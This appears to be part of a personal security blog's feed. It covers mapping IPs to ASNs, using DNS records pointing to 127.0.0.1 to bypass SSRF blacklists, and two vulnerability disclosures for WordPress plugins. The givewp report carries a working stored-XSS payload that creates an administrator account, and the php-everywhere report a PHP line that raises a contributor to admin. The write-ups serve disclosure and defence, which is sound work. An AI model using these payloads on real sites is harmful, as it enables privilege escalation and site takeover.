TABLE_DUMP2|1593640801|B|202.232.0.3|2497|8.8.8.0/24|2497 15169|IGP|202.232.0.3|0|0||NAG||
</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Get outgoing IP and asn</span>
bgpdump <span class="nt">-m</span> rib.20200701.2200.bz2  | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'|'</span> <span class="nt">-f</span> 4,5

<span class="c"># Find matches for a specific ASN</span>
bgpdump updates.20200428.1815 | <span class="nb">grep</span> <span class="s1">'AS6447'</span>
</code></pre></div></div>

<p>Parsing through a rib file you can find figure out what ASNs are associated with what ranges and are still active.</p>

<h2 id="conclusion">Conclusion</h2>
<p>So I’m still not concluded … but you can start to see how the pieces are coming together. I’m not clear on how you get specific states or cities, but that’s why things are not concluded.</p>

<h2 id="links">Links</h2>
<p>During my process of searching for data I always find useful looks that directly contributed to my discoveries or are related.</p>

<ul>
  <li><a href="https://host.io/">https://host.io/</a></li>
  <li><a href="https://blogofsomeguy.com/a/2017-07-26/fastmetrics-p4-mapping-ip-to-asn.html">https://blogofsomeguy.com/a/2017-07-26/fastmetrics-p4-mapping-ip-to-asn.html</a></li>
  <li><a href="https://github.com/t2mune/mrtparse/blob/master/examples/summary.py">https://github.com/t2mune/mrtparse/blob/master/examples/summary.py</a></li>
  <li><a href="https://ftp.ripe.net/ripe/ipmap/">https://ftp.ripe.net/ripe/ipmap/</a></li>
  <li><a href="https://asn.cymru.com/">https://asn.cymru.com/</a></li>
  <li><a href="https://www.iana.org/whois?q=67.187.185.36">https://www.iana.org/whois?q=67.187.185.36</a></li>
  <li><a href="https://search.arin.net/rdap/?query=67.187.185.36&amp;searchFilter=ipaddr">https://search.arin.net/rdap/?query=67.187.185.36&amp;searchFilter=ipaddr</a></li>
  <li><a href="https://team-cymru.com/community-services/ip-asn-mapping/">https://team-cymru.com/community-services/ip-asn-mapping/</a></li>
  <li><a href="http://rest.db.ripe.net/search?query-string=8.8.8.8&amp;type-filter=inetnum">http://rest.db.ripe.net/search?query-string=8.8.8.8&amp;type-filter=inetnum</a></li>
  <li><a href="https://hackertarget.com/as-ip-lookup/">https://hackertarget.com/as-ip-lookup/</a></li>
  <li><a href="https://rdap.arin.net/registry/ip/8.8.8.8">https://rdap.arin.net/registry/ip/8.8.8.8</a>
    <ul>
      <li>Look at <code class="language-plaintext highlighter-rouge">arin_originas0_originautnums</code> for ASN</li>
    </ul>
  </li>
  <li><a href="https://www.arin.net/resources/registry/whois/rdap/#rdap-urls">https://www.arin.net/resources/registry/whois/rdap/#rdap-urls</a></li>
  <li><a href="https://www.icann.org/rdap">https://www.icann.org/rdap</a></li>
</ul>]]></content><author><name></name></author><category term="tools" /><category term="ip" /><summary type="html"><![CDATA[I’ve wondered for quite some time, how do sites like https://ipinfo.io get their data? Secondly, the question I had was “Could I gather/build out the data used by these sorts of services?”. Off the bat, looking at the data, I made the assumption that the ownership data is stored publicly or “premiumly” that I could access, but where? So I did some digging around and below is some the datasets I discovered.]]></summary></entry><entry><title type="html">Getting sneaky with DNS for SSRF</title><link href="http://ahermosilla.com/security/2020/06/04/sneaky-dns-ssrf.html" rel="alternate" type="text/html" title="Getting sneaky with DNS for SSRF" /><published>2020-06-04T00:00:00+00:00</published><updated>2020-06-04T00:00:00+00:00</updated><id>http://ahermosilla.com/security/2020/06/04/sneaky-dns-ssrf</id><content type="html" xml:base="http://ahermosilla.com/security/2020/06/04/sneaky-dns-ssrf.html"><![CDATA[<p>Generally when I make http requests against a domain, I wouldn’t expect it to make requests on my localhost - but sometimes, just that happens. For getting sneaky with <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">SSRF</a> attacks you can have a DNS record point to <code class="language-plaintext highlighter-rouge">127.0.0.1</code>. When a record pointing to <code class="language-plaintext highlighter-rouge">127.0.0.1</code> is resolved, your application will end up making requests <code class="language-plaintext highlighter-rouge">127.0.0.1</code>. For experimentation, I used one of Rapid7’s free datasets, &amp; found the domain <code class="language-plaintext highlighter-rouge">volks-seat.de</code> pointing <code class="language-plaintext highlighter-rouge">127.0.0.1</code>. It never occurred to me you could do such a thing so I did some digging ;) to see what I could learn.</p>

<h3 id="check-record">Check Record</h3>
<p>You can check DNS record for a domain you suspect is pointing to <code class="language-plaintext highlighter-rouge">127.0.0.1</code>. Using dig check the <code class="language-plaintext highlighter-rouge">ANSWER</code> section for where the domain points. I confirmed <code class="language-plaintext highlighter-rouge">volks-seat.de</code> did in fact point to <code class="language-plaintext highlighter-rouge">127.0.0.1</code></p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig volks-seat.de | <span class="nb">grep</span> <span class="nt">-A2</span> <span class="s1">';; ANSWER'</span>
<span class="c"># ;; ANSWER SECTION:</span>
<span class="c"># volks-seat.de.          71858   IN      A       127.0.0.1</span>
</code></pre></div></div>

<h3 id="quick-test">Quick Test</h3>
<p>Okay, so DNS resolves the domain to <code class="language-plaintext highlighter-rouge">127.0.0.1</code>, how do applications actually respond to this? As a basic test, I started a webserver on my machine to simple list the contents of a directory.</p>

<ul>
  <li>Start up a webserver in a directory
    <ul>
      <li><code class="language-plaintext highlighter-rouge">pwd &amp;&amp; echo ruh_roh_raggy &gt; zzzzz_flag.txt</code></li>
      <li><code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer 8000</code></li>
    </ul>
  </li>
  <li>Fetch the page and see if anything looks familiar
    <ul>
      <li><code class="language-plaintext highlighter-rouge">curl http://volks-seat.de:8000</code>
        <ul>
          <li>You’ll see towards the end of the output <code class="language-plaintext highlighter-rouge">zzzzz_flag.txt</code></li>
        </ul>
      </li>
      <li><code class="language-plaintext highlighter-rouge">curl -vs http://volks-seat.de:8000 2&gt;&amp;1 | grep Connected</code>
        <ul>
          <li>When showing verbose output you’ll see curl connecting to <code class="language-plaintext highlighter-rouge">127.0.0.1</code></li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h3 id="example-app">Example App</h3>
<p>So how does this come into play with SSRF in your app? An application may have a whitelist/blacklist of valid hosts to perform certain actions against. Let’s imagine you had an app that simply checked if a site was up or not. We want to prevent users from trying to access private assets so we create a basic blacklist of hosts that we won’t want to be reached. Let’s take a look at this basic example below that captures the concept.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nv">$ignore_hosts</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="s1">'localhost'</span><span class="p">,</span> <span class="s1">'169.254.169.254'</span><span class="p">,</span> 
    <span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="s1">'192.168.0.1'</span><span class="p">,</span> <span class="s1">'10.0.0.1'</span><span class="p">,</span> <span class="s1">'172.16.0.1'</span><span class="p">,</span> 
<span class="p">];</span>
<span class="nv">$url_alive</span>    <span class="o">=</span> <span class="s2">"http://volks-seat.de:3000"</span><span class="p">;</span>
<span class="nv">$parsed_url</span>   <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url_alive</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$parsed_url</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">json_encode</span><span class="p">([</span><span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'Invalid host'</span><span class="p">]);</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$parsed_url</span><span class="p">[</span><span class="s1">'host'</span><span class="p">],</span> <span class="nv">$ignore_hosts</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">json_encode</span><span class="p">([</span><span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'Invalid host'</span><span class="p">]);</span>
<span class="p">}</span>

<span class="c1">// We should also check protocol ... </span>
<span class="c1">// ... but you get the idea</span>
<span class="nv">$response</span>    <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url_alive</span><span class="p">);</span>
<span class="nv">$status_code</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">" "</span><span class="p">,</span> <span class="nv">$http_response_header</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">??</span> <span class="s2">"HTTP/1.1 0 x"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">??</span> <span class="s2">""</span><span class="p">;</span>

<span class="k">return</span> <span class="nb">json_encode</span><span class="p">([</span>
    <span class="s1">'success'</span>     <span class="o">=&gt;</span> <span class="kc">true</span><span class="p">,</span>
    <span class="s1">'status_code'</span> <span class="o">=&gt;</span> <span class="nv">$status_code</span><span class="p">,</span>
    <span class="s1">'body'</span>        <span class="o">=&gt;</span> <span class="nv">$response</span><span class="p">,</span>
<span class="p">]);</span>
</code></pre></div></div>

<p>We can see the hostname is checked from the parse uri, but that is not enough to protect yourself. The example above is problematic because once the “bad” DNS record is resolved, the ip the hostname resolves to ends up being <code class="language-plaintext highlighter-rouge">127.0.0.1</code>. An attacker can “recon” our internal server adding tests for every port (0-65535) with the same domain to see what else can be found. If, for example, you had Elasticsearch running without authentication, an attacker could add the url <code class="language-plaintext highlighter-rouge">http://volks-seat.de:9200/_stats/indexing,store</code> and access content you wouldn’t want them to.</p>

<p>To actually make sure everything is sane, the application needs to resolve the host and make sure the host is not a host we want to ignore</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Resolve the ip and make sure that is not in the blacklist</span>
<span class="c1">// Naive, may not be performant</span>
<span class="nv">$ip</span> <span class="o">=</span> <span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$parsed_url</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]);</span> 

<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$parsed_url</span><span class="p">[</span><span class="s1">'host'</span><span class="p">],</span> <span class="nv">$ignore_hosts</span><span class="p">)</span> <span class="o">||</span> <span class="nb">in_array</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$ignore_hosts</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">json_encode</span><span class="p">([</span><span class="s1">'error'</span> <span class="o">=&gt;</span> <span class="s1">'Invalid host'</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="finding-records">Finding Records</h3>
<p>You can take a look at some dns records pointing to <code class="language-plaintext highlighter-rouge">127.0.0.1</code> using Rapid7’s public dataset
https://blog.rapid7.com/2018/10/16/how-to-conduct-dns-reconnaissance-for-02-using-rapid7-open-data-and-aws/</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">rapid7_fdns_any</span> 
<span class="k">where</span> <span class="n">value</span> <span class="k">like</span> <span class="s1">'127.0.0.1'</span>
<span class="k">order</span> <span class="k">by</span> <span class="nb">date</span> <span class="k">desc</span>
</code></pre></div></div>

<h3 id="links">Links</h3>
<ul>
  <li>https://owasp.org/www-community/attacks/Server_Side_Request_Forgery</li>
  <li>https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af</li>
  <li>https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</li>
  <li>https://portswigger.net/web-security/ssrf</li>
</ul>

<h3 id="dns-rebinding">DNS Rebinding</h3>
<p><strong>Related</strong></p>

<p>An app many check the DNS record for a domain to ensure the domain does not point to private instances. With DNS rebinding attacks, you have a short TTL for a record which changes between a public ip &amp; a private ip. Your application may see that a domain resolves to a public ip and then continues on to the request, but if you don’t explicitly use the ip that was resolved earlier, the library/module making requests may make another DNS query which resolves to a private ip since the original DNS request.</p>

<h4 id="links-1">Links</h4>
<ul>
  <li>https://medium.com/@brannondorsey/attacking-private-networks-from-the-internet-with-dns-rebinding-ea7098a2d325</li>
  <li>https://danielmiessler.com/blog/dns-rebinding-explained/</li>
  <li>https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/august/singularity-of-origin-a-dns-rebinding-attack-framework/</li>
  <li>https://github.com/nccgroup/singularity</li>
  <li>https://github.com/taviso/rbndr</li>
  <li>https://research.nccgroup.com/2020/03/30/impact-of-dns-over-https-doh-on-dns-rebinding-attacks/</li>
</ul>]]></content><author><name></name></author><category term="security" /><category term="ssrf" /><category term="dns" /><summary type="html"><![CDATA[Generally when I make http requests against a domain, I wouldn’t expect it to make requests on my localhost - but sometimes, just that happens. For getting sneaky with SSRF attacks you can have a DNS record point to 127.0.0.1. When a record pointing to 127.0.0.1 is resolved, your application will end up making requests 127.0.0.1. For experimentation, I used one of Rapid7’s free datasets, &amp; found the domain volks-seat.de pointing 127.0.0.1. It never occurred to me you could do such a thing so I did some digging ;) to see what I could learn.]]></summary></entry><entry><title type="html">Vulnerability Report - WordPress plugin - givewp</title><link href="http://ahermosilla.com/security/2017/11/27/vuln-givewp.html" rel="alternate" type="text/html" title="Vulnerability Report - WordPress plugin - givewp" /><published>2017-11-27T00:00:00+00:00</published><updated>2017-11-27T00:00:00+00:00</updated><id>http://ahermosilla.com/security/2017/11/27/vuln-givewp</id><content type="html" xml:base="http://ahermosilla.com/security/2017/11/27/vuln-givewp.html"><![CDATA[<p>This is a post I back dated to when I privately reported a vulnerability to givewp for their WordPress plugin. I privately shared via their support contact form. The version this XSS was found is long in the past!</p>

<blockquote>
  <p>I discovered an XSS vulnerability, details included in Vulnerability input.
If you have any questions or need more information please let me know! I wasn’t sure how to do a ‘private pull request’ otherwise I would have done that.</p>
</blockquote>

<h2 id="problem">Problem</h2>
<p>There is an Authenticated, Stored XSS that allows lower privileges users to craft an XSS payload in the form title that would enable them to create an administrator user they can login with. For the proof of concept, I created a user with the <em>Give Worker</em> role and created an admin user via the XSS.</p>

<h2 id="problem-source">Problem source</h2>
<p>I can’t find the original version of the source code, but here is the reference.
https://github.com/WordImpress/Give/blob/release/1.8.17/includes/admin/tools/logs/class-sales-logs-list-table.php#L75Raw</p>

<h2 id="steps-to-reproduce">Steps to reproduce</h2>
<ul>
  <li>1 - Add user with Give Worker role</li>
  <li>2 - Login to that user account or switch to that user using User Switching plugin</li>
  <li>3 - Add donation form at Give &gt; Add Form (/wp-admin/post-new.php?post_type=give_forms)</li>
  <li>4 - For form title use the minifiied title with script tags found here</li>
</ul>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">u5</span><span class="o">=</span><span class="dl">'</span><span class="s1">/wp-admin/user-new.php</span><span class="dl">'</span>
<span class="nx">u8</span><span class="o">=</span> <span class="dl">"</span><span class="s2">same-origin</span><span class="dl">"</span>
<span class="nf">fetch</span><span class="p">(</span><span class="nx">u5</span><span class="p">,{</span><span class="na">credentials</span><span class="p">:</span> <span class="nx">u8</span><span class="p">}).</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">r</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">n</span><span class="o">=</span><span class="p">{}</span>
  <span class="nx">fd</span><span class="o">=</span><span class="k">new</span> <span class="nc">FormData</span><span class="p">();</span>
  <span class="c1">// Create an admin user via XSS</span>
  <span class="nx">r</span><span class="p">.</span><span class="nf">text</span><span class="p">().</span><span class="nf">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">){</span>
    <span class="nx">m</span> <span class="o">=</span> <span class="sr">/_wpnonce_create-user" value="</span><span class="se">([^</span><span class="sr">"</span><span class="se">]</span><span class="sr">*</span><span class="se">?)</span><span class="sr">"/</span><span class="p">.</span><span class="nf">exec</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span>
    <span class="nx">n</span><span class="p">[</span><span class="dl">'</span><span class="s1">_wpnonce_create-user</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">m</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="nx">n</span><span class="p">.</span><span class="nx">action</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">createuser</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">n</span><span class="p">.</span><span class="nx">pass1</span><span class="o">=</span><span class="dl">'</span><span class="s1">pass9999999999</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">n</span><span class="p">.</span><span class="nx">pass2</span><span class="o">=</span><span class="dl">'</span><span class="s1">pass9999999999</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">n</span><span class="p">.</span><span class="nx">user_login</span><span class="o">=</span><span class="dl">'</span><span class="s1">test4565465</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">n</span><span class="p">.</span><span class="nx">email</span><span class="o">=</span><span class="dl">'</span><span class="s1">waiting@email.com</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">n</span><span class="p">.</span><span class="nx">role</span><span class="o">=</span><span class="dl">'</span><span class="s1">administrator</span><span class="dl">'</span><span class="p">;</span>
    <span class="nx">n</span><span class="p">.</span><span class="nx">_wp_http_referer</span><span class="o">=</span><span class="nx">u5</span><span class="p">;</span>

    <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">k</span> <span class="k">in</span> <span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">fd</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nx">k</span><span class="p">,</span> <span class="nx">n</span><span class="p">[</span><span class="nx">k</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="nf">fetch</span><span class="p">(</span><span class="nx">u5</span><span class="p">,</span> <span class="p">{</span>
      <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">post</span><span class="dl">'</span><span class="p">,</span>
      <span class="na">body</span><span class="p">:</span> <span class="nx">fd</span><span class="p">,</span>
      <span class="na">credentials</span><span class="p">:</span><span class="nx">u8</span>
    <span class="p">});</span>
  <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>
<p><strong>minified version</strong></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// &lt;script&gt;u5="/wp-admin/user-new.php",u8="same-origin",fetch(u5,{credentials:u8}).then(function(e){n={},fd=new FormData,e.text().then(function(e){m=/_wpnonce_create-user" value="([^"]*?)"/.exec(e),n["_wpnonce_create-user"]=m[1],n.action="createuser",n.pass1="pass9999999999",n.pass2="pass9999999999",n.user_login="test4565465",n.email="waiting@email.com",n.role="administrator",n._wp_http_referer=u5;for(var t in n)fd.append(t,n[t]);fetch(u5,{method:"post",body:fd,credentials:u8})})});&lt;/script&gt;</span>
</code></pre></div></div>

<p>https://gist.github.com/rezen/df6d132e2336424e9b3668ed7c5947a5</p>
<ul>
  <li>5 - Switch to administrator user</li>
  <li>6 - With an administrator account, go to Give &gt; Tools &gt; Logs (tab) (/wp-admin/edit.php?post_type=give_forms&amp;page=give-tools&amp;tab=logs)</li>
  <li>7 - Go observe new user added Users &gt; All Users (/wp-admin/users.php)</li>
</ul>

<h2 id="tested-on">Tested on</h2>
<ul>
  <li>WP Version: 4.8</li>
  <li>PHP Version: 5.6.30</li>
  <li>Plugin Version: 1.8.16</li>
  <li>Browser: Chrome 58</li>
</ul>]]></content><author><name></name></author><category term="security" /><category term="vulnerability" /><summary type="html"><![CDATA[This is a post I back dated to when I privately reported a vulnerability to givewp for their WordPress plugin. I privately shared via their support contact form. The version this XSS was found is long in the past!]]></summary></entry><entry><title type="html">Vulnerability Report - WordPress plugin - php-everywhere</title><link href="http://ahermosilla.com/security/2017/11/25/vuln-php-anywhere.html" rel="alternate" type="text/html" title="Vulnerability Report - WordPress plugin - php-everywhere" /><published>2017-11-25T00:00:00+00:00</published><updated>2017-11-25T00:00:00+00:00</updated><id>http://ahermosilla.com/security/2017/11/25/vuln-php-anywhere</id><content type="html" xml:base="http://ahermosilla.com/security/2017/11/25/vuln-php-anywhere.html"><![CDATA[<p>This is a post I back dated to when I privately reported a vulnerability to the author of the php-everywhere plugin. I discovered a low privileged user could execute arbitrary PHP code and provided a POC where a low priv user could upgrade their permissions to admin. (The plugin is no longer available for downloadhttps://wordpress.org/plugins/php-everywhere/)</p>

<hr />

<p><br /></p>
<blockquote>
  <p>Hi Alexander, I discovered a vulnerability in the PHP EveryWhere Plugin.</p>
</blockquote>

<h2 id="steps">Steps</h2>
<ul>
  <li>1 - In PHP EveryWhere plugin options, set user role management option to Administrator only</li>
  <li>2 - Login as a contributor, or use User Switching plugin to switch to a contributor user.</li>
  <li>3 - Observe user id via JavaScript <code class="language-plaintext highlighter-rouge">console.log(userSettings.uid)</code> or from the field on the source code on /wp-admin/profile.php. The user is able to find their user_id.</li>
  <li>4 - As contributor, add new post, with whatever title they want &amp; with content of <code class="language-plaintext highlighter-rouge">[php_everywhere]</code>.
    <ul>
      <li>They add a custom field with name of php_everywhere_code and use example value from below, with their user_id (using 4 for examples sake)
        <ul>
          <li><code class="language-plaintext highlighter-rouge">&lt;?php wp_update_user(array('ID' =&gt; 4,'role'=&gt;'administrator'));?&gt;";</code></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>5 - Save draft, preview post</li>
  <li>6 - Go to dashboard and observe, wallah, privileges upgraded to admin.</li>
</ul>

<p>An administrator would expect, which that setting that contributors/editors would not be able to execute php, but that is not the case. With example below a contributor is able to make themselves an admin and do whatever they please.</p>

<p>What should happen, is in the function <code class="language-plaintext highlighter-rouge">php_everywhere_data</code> you should check if the option was set to Administrator only, and if the current user was not an administrator, then you should not save. Additionally you need filter out the key php_everywhere_code in the meta set in the <code class="language-plaintext highlighter-rouge">$_POST</code>.</p>

<p>I’d also like to mention, it is probably safer to make the default setting that only admins by default can execute PHP, not editors &amp; contributors.</p>]]></content><author><name></name></author><category term="security" /><category term="vulnerability" /><summary type="html"><![CDATA[This is a post I back dated to when I privately reported a vulnerability to the author of the php-everywhere plugin. I discovered a low privileged user could execute arbitrary PHP code and provided a POC where a low priv user could upgrade their permissions to admin. (The plugin is no longer available for downloadhttps://wordpress.org/plugins/php-everywhere/)]]></summary></entry></feed>